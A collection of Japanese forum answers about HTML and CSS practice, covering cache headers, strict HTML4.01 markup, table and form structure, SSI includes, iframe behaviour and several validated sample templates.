更新日自体は、HTTP応答ヘッダを確認すればわかります。 　firefox + Live HTTP Headers( https://addons.mozilla.jp/firefox/details/3829 ) キャッシュをさせないときは、HTTP応答ヘッダに Pragma: no-cache Cache-Control: no-cache を加えるように、.htaccessで指定します。そのディレクトリ以下のhtmlとgif,jpegに対してなら <Files ~ "\.(html|jpe?g|gif)$"> Header set Pragma no-cache Header set Cache-Control no-cache Header set Expires 0 </Files> HTML自体に記述する場合は <meta http-equiv="Pragma" content="no-cache"> <meta http-equiv="Cache-Control" content="no-cache"> <meta http-equiv="Expires" content="0"> ＞<head></head>をひとつのページに２つ書くことになります。 <!ENTITY % html.content "HEAD, BODY"> ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) とあるように、「HEAD+(ひとつ以上)」でないので、HEAD要素とBODY要素はひとつずつです。 ＞現在は非推奨とか、今は無効・不可・・・などの 　正しいのは何かを普通に検索するのは無駄の最たるものです。藁の中の針を探すより難しい。 　書いたHTMLを、 ★Another HTML-lint 5 ( http://www.htmllint.net/html-lint/htmllint.html ) ★The W3C Markup Validation Service ( http://validator.w3.org/#validate_by_input ) 　で調べれば確実です。特に前者はなにがどう間違っているか、どうすべきかをランクをつけて説明してくれますから、初心者には最適です。--私は常に使っている。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 著者 　・・・【中略】・・・ 　HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。 HTML 4仕様が定める各DTDの詳細については バージョン情報の項を参照のこと。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［4 適合条件: 必須事項と推奨事項/4.1 定義( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より ・・この仕様書が勧告されたのは1999年ですが、いまだに、新しく登場するページにtransitinal(移行型)やframesetが使われていることを見ると・・・。次期HTML5が勧告間近ですが、それはHTML4.01strictの改訂版です。 　HTML4.01strictで作成し、検証サイトでチェックするのが確実で正解です。 　またわからないときは、 HTML 4.01仕様書 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　を読みましょう。ブックマークに入れておいて、わからないときは最初にチェックする癖をつける 　とそのうち読み方がわかるようになります。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 本仕様書は様々な方法で利用できるだろう。 　 最初から最後まで通読する。 本仕様書は、HTMLに関する一般表現から始まり、 　末尾に向けて徐々に技術的で特殊な内容になっていく。 ・必要な情報に直接アクセスする。 　　できるだけ素早くシンタクスやセマンティクスに関する情報を得るために、オン 　ライン版の仕様書には次の特徴を持たせた。 　　　・要素や属性についての参照は何れも、本仕様書内の当該要素・属性の定義箇所 　　　　にリンクしている。 各要素及び属性は、その一箇所で定義している。 　　　・各ページに索引へのリンクがあるので、 要素または属性の定義を読むために、 　　　　2回より多くリンク移動する必要はない。 　　　・言語リファレンスマニュアルの各ページ冒頭には、全体の目次より更に詳細に 　　　　当該ページ内容を記したページ目次を掲げてある。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［1.2 仕様の記述法( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より
<map><area>というタグで1枚絵等から任意のポジションを指定してリンクに変更すると言う方法があります。 上記タグを応用すれば、デザインとリンクで切り分けそのものは可能です。 こういうのも検討されると、選択の幅が広がると思います。 参考URL：http://html.eweb-design.com/0603_map.html
RSSを読み込んで表示するphpを書けばいいんじゃないでしょうかね？ 参考のサイトのRSSのソースを見ると、MTを使ってるようなので MT使わないと全く同じやり方では出来ないと思いますけど。 http://www.edia.co.jp/news/atom.xml MT以外でもWordpressでもいいと思いますが、CMSで記事を作成し、記事一覧に表示され、RSSフィードが更新される。 そのRSSをトップページに読み込めばいいと思います。 あんまり詳しくないんですが、普通のCMSならそもそもRSSなんて使わなくても記事一覧は任意の場所に引っ張って来れると思います。 CMSを使わないで、ニュースページを手動で更新するのでしたら、 Dreamwerverのライブラリを使えばひとつのファイルの更新で２ページ分反映できます。
tableで配置をするのは、最も避けなければならない方法です。 『非視覚系メディアでのレンダリングに際して問題を起こすことがあるため、単に文書内容を整形する目的だけで表を用いるべきでない。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 『ページレイアウトの目的で表を用いる。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 　もちろん、それが表であるなら、きちんと記述すると <body> 　<table summary="サンプルの表" border="1" style="margin:0 auto;"> 　　<tbody> 　　　<tr> 　　　　<td>セルの内容</td> 　　　</tr> 　　</tbody> 　</table> </body> ★<center>は非推奨です。HTML4.01strict/XHTML1.0strict/XHTML1.1/HTML5にはありません。
＞このcommon.cssに修正がある場合、本番に影響ないようにするためにはやはり現在使っているスタイルをそのままにし、 　今まさにその作業をしているのですが、私はローカルサーバーで修正しますから、サイト全体(もしくは必要なところ)を一旦ローカルにコピーして修正します。 　スタイルシートを修正すれば、当然すべてのスタイルに影響を及ぼしますから、どうしても全部を降ろしておく必要がありますね。 　数ページの修正の場合、あらたにスタイルシートを追加する「当座しのぎ」もありますが--同じ詳細度だったら後出の物が優先される--。いずれ大変なことになるので。
『FORM要素は、コントロールの入れ物として働き、 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』ますから、必ず <form action="[送信先1]"> 　　<input type="submit" vlue="[1]へ送信"> </form> <form action="[送信先2]"> 　　<input type="submit" vlue="[2]へ送信"> </form> で、なければなりません。 　どのように配置するかは、スタイルシート側の問題です。 　通常は、ひとつのFORMで送信して、submitのnameによって、どのデータを利用するかを決めるほうが良いです。
No.2さんに、まことに申し訳ないのですが・・ <span>は行内要素ですから、<body>直下には置けませんから、<span>でマークアップするにしても、やはり <p><span>・・ <div><span> しかないです。この場合、spanが<p>をまたぐことはできませんが、ブラウザによると適当に解釈してまたぐように見える場合がありますが、本来はまたいではなりません。--ブラウザの仕様によります。 　また、<body><span>であっても動作するかもしれませんが、その場合に期待通りに動作するか否かはブラウザによって差があります。 　基本的には、下記サンプルのようにきちんとHTMLを書いてスタイルシートでデザインするべきでしょう。 　また、hrではなく、sectionで括って、二番目以降のsectionには上線を引くというほうが、スマートで色々と応用が利いてよいです。 ★Another HTML-lint 5 ( http://www.htmllint.net/ ) ★W3C CSS 検証サービス ( http://jigsaw.w3.org/css-validator/#validate_by_ … ) で検証済みのHTML4.01strict+CSS2.1[ウェブ標準]です。 ※タブは＿に置換してあります。戻すこと <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- html,body{margin:0;padding:0;} div.header,div.section,div.footer{width:70%;margin:0 auto;background-color:silver;} h1,h2,h3,p{margin:0 auto;} /* 初期値のcolorを指定 */ body{color:green;background-color:gray;} /* hrの指定 */ hr{border-color:blue;} /* div.section中「半角スペース」のpについて */ div.section p{color:fuchsia;} /* sectionの次のsectionに上線を引く */ div.section+div.section{border-top:4px double purple;} --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<p>このページでは・・・・</p> ＿</div> ＿<div class="section"> ＿＿<h2>見出し</h2> ＿＿<p>ここはfuchsia</p> ＿＿<hr> ＿＿<p>ここもfuchsia</p> ＿</div> ＿<div class="section"> ＿＿<h2>見出し</h2> ＿＿<p>ここはfuchsia</p> ＿＿<hr> ＿＿<p>ここもfuchsia</p> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2012-08-10</dd> ＿＿＿<dt id="LAST-MODIFIED">Last Modified</dt> ＿＿＿<dd>2012-08-10 12:00:00 (JST)</dd> ＿＿</dl> ＿＿<address>&copy; ORUKA1951 2012 - 2016 All Rights Reserved mailto:*****</address> ＿</div> </body> </html>
＞上手くいなかく何故だか数字がどこにも表示されないです。 　本人がわからないものを、なにをどうしたかが判らない第三者には推測もできません。 　・スタイルシートを確認しないとわかりません。 　・テンプレートはたどり着けません。(FC2のアカウントが必要?) 　firefox+firebugで確認してください。 　いっそのこと、スタイルシートでcountプロパティを使うほうがよいかと思いますが・・・
サーバーにデータを送信するためのformやinputを使うのは、間違いです。 →14.1 スタイルシートの概説 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　HTMLを作成する上で、もっとも大事なことです。かっては多く使用されていたため、『Webページはより複雑化し、限られた環境にしか適応しなくなり、相互運用性問題に悩まされることとなり、 ・・・( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 　ごく普通に、リンクならリンクとしてHTMLを記述して、スタイルシートでそれをどのようにプレゼンテーション(表現)するかを指定すると、『例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』は、むろん検索エンジンにも理解してもらえるページが作成できます。 　参考にされている資料はとても古いもののようです。 <p><a href="http://www.yahoo.co.jp/">Yahoo! JAPAN</a></p> などで、良いですよ。 　そしてスタイルシートでデザインを決めていきます。そうすることで 『HTMLにおける制限されたプレゼンテーション機構に取ってかわる。スタイルシートでは、行間の設定やインデントの設定、テキスト色や背景色、フォントのサイズとスタイル、その他様々なプロパティの設定が簡単にできる。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 下記にサンプルを上げておきます。 ★Another HTML-lint 5 ( http://www.htmllint.net/html-lint/htmllint.html# ) ★W3C CSS 検証サービス ( http://jigsaw.w3.org/css-validator/#validate_by_ … ) 　で検証済みの、ウェブ標準HTML4.01strict+CSS2.1です。 ※タブは＿に置換してありますから戻してください。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- p.nav a{ ＿display:block; /* ブロックにして */ ＿width:12em;line-height:1.6em;/* サイズを決め */ ＿margin:0 auto; /* 表示位置を決め */ ＿border:outset 3px gray;/* 枠線のデザインを決め */ ＿text-align:center;text-decoration:none;/* 文字のデザインを決め */ ＿color:black;background-color:silver;/*色と背景を決め */ } p.nav a:hover{/*ポインターが乗ったとき */ ＿background-color:rgb(220,220,220) } p.nav a:active{/* 押されたとき */ ＿border:inset yellow;background-color:yellow; } --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<p>このページでは・・・・</p> ＿</div> ＿<div class="section"> ＿＿<h2>見出し</h2> ＿＿<p class="nav"><a href="http://www.yahoo.co.jp/">Yahoo! JAPAN</a></p> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2012-08-10</dd> ＿＿＿<dt id="LAST-MODIFIED">Last Modified</dt> ＿＿＿<dd>2012-08-10 12:00:00 (JST)</dd> ＿＿</dl> ＿＿<address>&copy; ORUKA1951 2012 - 2016 All Rights Reserved mailto:*****</address> ＿</div> </body> </html>
最初は、正しいものを学んだほうが良い様な気がします。summaryとtbodyは推奨ではなく必須です。それを書かなくてもブラウザは表示してくれますが・・ <table summary="果物の一覧" class="list"> <!-- tableの種類訳をするためにclassをつけておくと便利 --> 　<tbody> 　　<tr> 　　　<td>りんご</td><td>甘酸っぱい</td><td>おおむね赤</td> 　　</tr> 　　<tr> 　　　<td>なつみかん</td><td>かなり酸っぱいと思う</td><td>たいてい黄色</td> 　　</tr> 　</tbody> </table> table.list{ 　border-collapse:collapse; 　border-style:double; 　border-color:red; 　border-width:4px; 　border:double red 4px;/* と、この３行をまとめて書いても良い */ } table.list td{ 　border: solid 1px blue; 　padding: 0.5em; } と、スタイルシートを使うとtableの外枠とセルを個別に指定できます。上下左右でデザインを変えることも、内容のないセルの枠線の表示とかも自由自在にデザインできます。CSS3を使えば影をつけたり縁を丸めたり・・ table.list{ border-collapse:collapse; border:solid red 4px; box-shadow: 10px 10px 10px rgba(0,0,0,0.4); } table.list td{ border: solid 1px blue; padding: 0.5em; } table.list td+td{ border-right-color:red; } →8.5 ボーダーのプロパティ（Border properties） ( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) →17.6 ボーダー（Borders） ( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … )
わざわざ非推奨のiframeを使わなくても、imgかobjectで良いのでは・・、というかそうすべきなのですが <img src="qqq.gif" height="150" width="356" name="tv" alt="なんたらかんたら"> もちろん、いずれにしてもリンクのターゲットですから、href="[ページへのバス]#tv">画像へ</a> きちんと書くなら <p class="figure" id="ABC"> 　<img src="qqq.gif" height="150" width="356" name="tv" alt="なんたらかんたら"> </p> もしくは <p class="figure" id="ABC"> 　<object data="qqq.gif" type="image/gif"> 　　なんたらかんたら 　</object> </p> で、#ABC ・・・iframe,img,objectは行内要素なのでブロック要素で囲む必要があります。
現在javascriptよりはCSSのほうが主流でしょうから・・ 　スタイルシートの、擬似要素:afterか:beforeに対して、contentプロパティで内容の追加をします。 　ただし、画像のような「内容のない要素」空要素には追加ができません。簡単に説明できる内容ではないので仕様書を上げておきます。 12. 生成内容、自動番号振り、リスト ( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) 5.12.3 :before及び:after 疑似要素（The :before and :after pseudo-elements） ( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) 　なお、こ仕様書はCSS2ですが、現在ウェブ標準のCSS2.1の良い邦訳を知りません。この部分は、すこし変更があってややこしいですが ※空要素には内容を追加できません(CSS2では説明されていなかった) ※改行させるにはwhite-spaceの設定が必要 　いくつかの値がなくなりました。 img:hover:after{}ではダメです。 <p class="figure"><img??? p.figure:hover:after{}でなければなりません。
フォームをサーバーサイドで生成されていると思いますが、その際に送信されてくるデータに基づいて、フォームを書きます。 　たとえば、$FORM{'toyota'}=='1'でしたら、 my $TOYOTA_chect=""; if($FORM{'toyota'} == 1){$TOYOTA_chect="checked";} 　フォームのほうは <input type="checkbox" $TOYOTA_chect> 　としてあれば、 while(<DATA>){print OUT;} 　で良いです。 　あらかじめ、すべてのコントロールに、$[わかりやすい名称]_checkを入れておけば良いです。
とあるWebページにおいて、iPadのsafariで同様の現象を確認したことがあります。 原因としては、下記URLにもある通りJavaScriptによるHTMLの書き換えによるものだと思われます。 挙動としては、ページの内容に変更があった時、再描画する際にURLの情報からアンカーの場所に移動しているのだと思われます。 回避方法としては、JavaScriptによるページの変更をしないことですね。 先に述べたWebページでは、きちんと最後までページを読み込ませてからスクロールすると発生しませんでしたので、ページの描画中に色々と内容を変更していて、変更が完了しないうちにスクロールしたのだと思います。 （あくまで予測ですが。） もしリアルタイムに情報を更新するような画面であれば、その部分だけインラインフレームにすることで回避できるかもしれません。 （全く実証していないので可能性の提示です。） http://hamalog.tumblr.com/post/3158769710/ios-sa …
ORUKA1951です。 なぜ、ページがスクロールしてくれないのかを、どうしたら説明できるかを考えていました。 　まず、通常のページでページ内アンカーがある場合を考えて見ましょう。視覚系ブラウザでは、表示領域の高さをウィンドウの高さとしています。そのため、 ・ウィンドウ内にすべて表示されている場合はページはスクロールしません。してはなりません。 ・ページの高さがウィンドウ幅より高く、それが表示されていない場合は、リンクでスクロールされます。そのときページの最下段はウィンドウ内に収まるようにスクロールされます。 　これが、狭いウィンドウで長いページを表示させる仕組みです。 　frame/iframe/objectを使って外部ファイルを表示させたときは、ウィンドウの高さではなく、指定された高さを表示領域として動作します。これは、その指定されたサイズを表示可能領域としないと、レンダリングそのものができないからです。 　すなわち、「page.htmlは縦長で、heightを調整してスクロールバーが出ない状態に」しているために、当然あるべき姿なのです。埋め込まれたページは、それを埋め込んだページが表示されている区画を知ることができないのですからね。 　したがって、子供であるHTMLが、その親であるHTMLを引き上げることは不可能ですし、そうあってはならないのです。 　対処としては、先に述べましたようにSSIを使って、そのHTML(<HEAD><BODY>わ含まない)ソースを本体HTML内にサーバー側で組み込むか、javascriptを使って---基本的にSSIと仕組みは同じでHTML全体を埋め込むことはできない----を使って埋め込むしか方法はありません。 　先の例で言うと <div class="article"> <!--#include file="page.html" --> </div> として、page.htmlは 　<div class="header"> 　　<h1>タイトル</h1> 　　<p>このページでは・・・・</p> 　</div> 　<div class="section"> 　　<div class="section" id="A1"> 　　　<h2>一章見出し</h2> 　　　<p>・・・</p> 　　</div> 　　<div class="section" id="A2"> 　　　<h2>二章見出し</h2> 　　　<p>・・・</p> 　　</div> 　　<div class="section" id="A3"> 　　　<h2>三章見出し</h2> 　　　<p>・・・</p> 　　</div> 　　<div class="section" id="A4"> 　　　<h2>四章見出し</h2> 　　　<p>・・・</p> 　　　<p>・・・</p> 　　　<p>・・・</p> 　　</div> 　　<div class="contentTable"> 　　　<ol> 　　　　<li><a href="#A1">A1</a></li> 　　　　<li><a href="#A2">A2</a></li> 　　　　<li><a href="#A3">A3</a></li> 　　　　<li><a href="#A4">A4</a></li> 　　　</ol> 　　</div> 　</div> 　<div class="footer"> 　　<h2>文書情報</h2> 　</div> ということです。こうすると、includeの部分がすっかり置き換わります。 [補足] articleというclass名は、完結したひとつの記事と言う意味を示します。 →DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) →article 要素はブログのエントリや新聞記事など、文書内で自己完結可能な箇所を示します。 ( http://standards.mitsue.co.jp/resources/w3c/TR/h … ) あなたの利用しているサーバーの種類や設定がわかりませんが、可能ならファイル名を index.shtml として、テストすると良いかもしれません。
javascriptを使います。 　たとえば「 セレクトボックスの操作－JavaScript入門 ( http://www.pori2.net/js/form/5.html ) 」
　無理だと思います。そもそもiframeは他の他のページを表示するためのもので、あってページを整理するためではありません。スタイルシートはiframe内には利きません。またユーザーがフォントサイズをすこし変えたら見えなくなったり、小さくなりすぎたり・・ 　そもそも、 ＞HTMLで作っていたページがゴチャゴチャして来たので 　はあってはならないのです。HTMLは、その文書を、それを構成する要素に分解して、その要素がその文書にとってどのような構成要素であるかをタグによってマークアップして整理するためのものですから、HTMLにすれば、整理整頓されるはずです。決してデザインのためではありませんし、デザインのために要素(タグ)を使ってはなりません。 　たとえば長くて複雑な文書を、HTML5的に書くと 　　・HTML5では文書の構成がわかるように新しい要素が追加されました。 　　　→HTML5 新しい要素 ( http://standards.mitsue.co.jp/resources/w3c/TR/h … ) 　　・HTML4ではdivやspanにclassやidを使用して文書構造を示していました。 　　　→DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) [例]　これら新しい要素はHTML4.01では<dic class="article">などと書くことになっていたもの <body> 　<article> 　　<header> 　　　<nav> 　　　</nav> 　　</header> 　　<section> 　　　<section> 　　　　<section> 　　　　</section> 　　　　<section> 　　　　</section> 　　　</section> 　　<section> 　　　<section> 　　　　<section> 　　　　</section> 　　　　<section> 　　　　</section> 　　　</section> 　　　<aside> 　　　</aside> 　　</section> 　　<footer> 　　</footer> 　<article> </body> 　　　 　のように整理されます。HTMLにすれば、ゴチャゴチャしなくなるはずです。 　そのあと、スタイルシートで好きなようにデザインします。 body>section{width:80%;margin:0 auto;} section section{margin-left:10px;} 　もし、まったく同じ内容をたくさんのページに記述する必要があるなら、単にコピーペーストするなり、SSIを使うとかします。また、特定のページを参考にするなどの場合はiframe(strictではありません)を使いますが、いずれも整理整頓には役立ちません。 　いずれHTML5の時代が到来します。HTMLの基本に立ち返って再出発するほうが、はるかに早く効率的かと思います。 　本題の質問の回答ではありませんので心苦しいのですが、iframeじゃ無理ですから・・。 　文書を文書構造に基づいて整理整頓するのがHTMLの最大の目的ですから、HTML自体を見直すことをお勧めします。
そこに書かれているeditOuterSeal.doの36行目・・・
No.4です。 ＞その最初のタグが出てこない ということで、HTML4.01strictで使用するタグを整理してみました。全部で78個あります。 1) 必ず使うが、覚えなくてよいもの--テンプレートで済む。 　　<HTML><BODY><HEAD><LINK><META><STYLE><TITLE> 　　　たまに使うがテンプレートやコピペで間に合うもの 　　　<NOSCRIPT><SCRIPT><BASE> 2) 必ずと言うくらい使うもの--覚えて置いたらよいもの 　　<A><BLOCKQUOTE><DIV><DD><DL><DT><EM><H1><H2><H3><H4><H5><H6> 　　<HR><OL><P><IMG><LI><PRE><Q><SPAN><STRONG><SUB><SUP><TT><UL> 　　　存在を知っておくとよいもの(できれば使うべきもの) 　　　<ADDRESS> 3) 表を作成するときに最低限必要なもの 　　<CAPTION><TABLE><TBODY><TD><TH><TR> 　　　必須ではないが、仕様書を見ながらで間に合うもの 　　　　<COL><COLGROUP><TFOOT><THEAD> 4) フォームを作るときにいるもの 　　<FORM><INPUT><OPTION><SELECT><TEXTAREA> 　　　フォームのときたまに使うもの、めったに使わないもの 　　　<BUTTON><FIELDSET><LABEL><OPTGROUP><LEGEND> 5) めったに使わないが存在は知っておくべきもの 　　<ABBR><DEL><INS> 6) 使わないほうがよいもの、使うべきでないもの!-- これは意外かも--- 　　<B><BIG><BR><I><SMALL> 7) オブジェクト--動画など、画像やiframeの代わりに使う 　　<OBJECT><PARAM><VIDEO> 8) 特殊な分野でないと使わないもの。知っていれば使いたくなるもの 　　<BDO><CITE><CODE><DFN><KBD> 9) クライアントサイドマップ 　　<MAP><AREA><SAMP><VAR> 10) 絶対に使わないもの 　　<ACRONYM> 　一般的なサイトでは、この半分使えば・・すごい・・かも →Index of the HTML 4 Elements ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )
HTMLでは無理です。<option>の中に<a>を入れる事は出来ません。 CGIを使うか、JavaScriptを使えば可能です。 以下CGI（PHP）を使った場合 ----HTML---- <form action="location.php"> <select name="abc"> <option value="aa">aa</option> <option value="bb">bb</option> <option value="cc">cc</option> <option value="dd">dd</option> <option value="ee">ee</option> </select> <input type="submit" value="そこに飛ぶ"> </form> ----location.php---- header("Location: http://www.example.com/".$_GET["abc"].".html");
＞このようにすれば画像は切れますがアスペクト比は維持されると考えています。 　いえ、アスペクト比とは画像の縦横比のことですから、トリミングしたらダメなのです。 200(W)×400(H),600×200,300×300 　→300(W)×600(H),300×100,300×300　アスペクト比を変えずに300(W)で統一した場合 200(W)×400(H),600×200,300×300 　→150(W)×300(H),900×300,300×300　アスペクト比を変えずに300(H)で統一した場合 　です。
<thead>と<tbody>はひとつの<table>要素内に書かないとダメです。 そもそも11.2.1 TABLE要素 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )にあるように <!ELEMENT TABLE - - 　　(CAPTION?, (COL*|COLGROUP*), THEAD?, TFOOT?, TBODY+)> とあるように、 CAPTION　　?　ひとつかゼロ個 (COL または　COLGROUP はゼロ個以上 THEAD　　?　ひとつかゼロ個 TFOOT　　?　ひとつかゼロ個 TBODY　　+　一個以上必須 と書かれています。 　tableのヘッダ部分を固定するのは以前に テーブルをスクロールさせるときのスクロールの位置 - HTML - 教えて！goo ( http://oshiete.goo.ne.jp/qa/7105490.html ) 　で検討しましたが、とても難しいです。上記を読めば概略はわかるかと思います。
IE8以降に対応させるためには、HTMLが煩雑になるので嫌だけど・・ ＿＿<div class="nav"> ＿＿＿<ul> ＿＿＿＿<li id="hokkaidou"><a href="/hokkaidou">北海道</a><img src="./images/map/hokkaidou.gif" width="640" height="400" alt=""></li> ＿＿＿＿<li id="aomori"><a href="/aomori">青森県</a><img src="./images/map/aomori.gif" width="640" height="400" alt=""></li> ＿＿＿＿<li id="akita"><a href="/akita">秋田</a><img src="./images/map/akita.gif" width="640" height="400" alt=""></li> ＿＿＿＿<li id="iwate"><a href="/iwate">岩手県</a><img src="./images/map/iwate.gif" width="640" height="400" alt=""></li> ＿＿＿＿<li id="yamagata"><a href="/yamagata">山形県</a><img src="./images/map/yamagata.gif" width="640" height="400" alt=""></li> ＿＿＿＿<li id="fukushima"><a href="/fukushima">福島県</a><img src="./images/map/fukushima.gif" width="640" height="400" alt=""></li> ＿＿＿</ul> ＿＿</div> として、 <!-- div.nav{ ＿width:640px;height:400px; ＿margin:0 auto; ＿border:ridge 3px gray; ＿font-size:9px;line-height:16px; ＿position:relative; ＿background-color:white; ＿z-index:10; } div.nav ul,div.nav ul li{display:block;list-style-type:none;margin:0;padding:0;} div.nav ul li img{display:none;position:absolute;top:0;left:0;} /* 白地図 */ div.nav ul{width:100%;height:100%;background:transparent url(./images/map/white.gif);z-index:10;} /* 県名の位置 */ div.nav ul li{position:absolute;} #hokkaidou{left:500px;top:80px;} #aomori{left:425px;top:170px;} #iwate{left:430px;top:210px;} #akita{left:400px;top:200px;} #yamagata{left:380px;top:230px;} #fukushima{left:410px;top:245px;} #hokkaidou img{left:-500px;top:-80px;} #aomori img{left:-425px;top:-170px;} #iwate img{left:-430px;top:-210px;} #akita img{left:-400px;top:-200px;} #yamagata img{left:-380px;top:-230px;} #fukushima img{left:-410px;top:-245px;} div.nav ul li:hover img{display:block;z-index:-20} -->
＞その場合の記述はどのようになるのでしょうか？ 　リキッドデザイン・・ウィンドウ幅に制約されない・・簡単なサンプル書いておきます。(画像は用意してください。) 　ご覧になるとわかるとおり、HTMLは文書構造しか書いていませんから簡単ですね。誰でも手を入れられるはずです。 　一方のスタイルシートは、HTMLの文書構造を基に書いていますから、HTMLを開かなくても修正が出来るはずです。 　このように文書構造とプレゼンテーションを分離することで、とても簡単になり、どのようにでもデザインできます。 ポイントはHTMLは文書構造しか書かない・・。 ★Another HTML-lint 5 ( http://www.htmllint.net/html-lint/htmllint.html ) ★The W3C Markup Validation Service ( http://validator.w3.org/#validate_by_input ) ★W3C CSS 検証サービス ( http://jigsaw.w3.org/css-validator/#validate_by_ … ) で検証済みのHTML4.01strict+CSS2.1です。 タブは＿に置換してあるので戻すこと。 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- html,body{margin:0;padding:0;} p{margin:0 auto;text-indent:1em;} div.header{height:100px;background-color:red;} div.header h1{margin:0 auto;} div.section{padding-bottom:100px;} div.section div.section{padding-bottom:10px;} div.section ul,div.section ul li{display:block;list-style:none;margin:0;padding:0;} div.section ul,div.section div.section,div.section h2{margin-left:30%;} div.section ul li ul{margin-left:0;} div.section ul li{width: 200px;height:300px;float:left;margin-left:10px;} div.section ul li ul li{float:none;height:auto;} div.section div.section{clear:left;} div.footer{position:fixed;width:100%;background-color:gray;height:100px;bottom:0;font-size:0.9em;} div.footer>*{margin:0 50% 0 0} form input[type="submit"]{position:fixed;bottom:20px;right:20px;z-index:10;font-size:2em;} #contentTable{position:fixed;top:120px;left:10px;} --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>商品一覧</h1> ＿＿<p>このページでは・・・・</p> ＿</div> ＿<div class="section" id="productList"> ＿＿<h2>商品を選択してください。</h2> ＿＿<form action="#"> ＿＿＿<ul> ＿＿＿＿<li><img src="./images/photo/01.jpg" width="200" height="200" alt="商品1"> ＿＿＿＿＿<ul> ＿＿＿＿＿＿<li>なんたらかんかたら</li> ＿＿＿＿＿＿<li>価格:10,000円</li> ＿＿＿＿＿＿<li>かごに入れる<input type="text" size="2" name="p1" value=""></li> ＿＿＿＿＿</ul> ＿＿＿＿</li> ＿＿＿＿<li><img src="./images/photo/02.jpg" width="200" height="200" alt="商品2"> ＿＿＿＿＿<ul> ＿＿＿＿＿＿<li>なんたらかんかたら</li> ＿＿＿＿＿＿<li>価格:10,000円</li> ＿＿＿＿＿＿<li>かごに入れる<input type="text" size="2" name="p2" value=""></li> ＿＿＿＿＿</ul> ＿＿＿＿</li> ＿＿＿＿<li><img src="./images/photo/03.jpg" width="200" height="200" alt="商品3"> ＿＿＿＿＿<ul> ＿＿＿＿＿＿<li>なんたらかんかたら</li> ＿＿＿＿＿＿<li>価格:10,000円</li> ＿＿＿＿＿＿<li>かごに入れる<input type="text" size="2" name="p3" value=""></li> ＿＿＿＿＿</ul> ＿＿＿＿</li> ＿＿＿＿<li><img src="./images/photo/04.jpg" width="200" height="200" alt="商品4"> ＿＿＿＿＿<ul> ＿＿＿＿＿＿<li>なんたらかんかたら</li> ＿＿＿＿＿＿<li>価格:10,000円</li> ＿＿＿＿＿＿<li>かごに入れる<input type="text" size="2" name="p4" value=""></li> ＿＿＿＿＿</ul> ＿＿＿＿</li> ＿＿＿＿<li>いくつでも増やせます。ウィンドウ幅を変えてもOK!!</li> ＿＿＿</ul> ＿＿＿<p><input type="submit" name="productList1" value="　バスケットに入れる　"></p> ＿＿</form> ＿＿<div class="section" id="tediously1"> ＿＿＿<h3>御託１</h3> 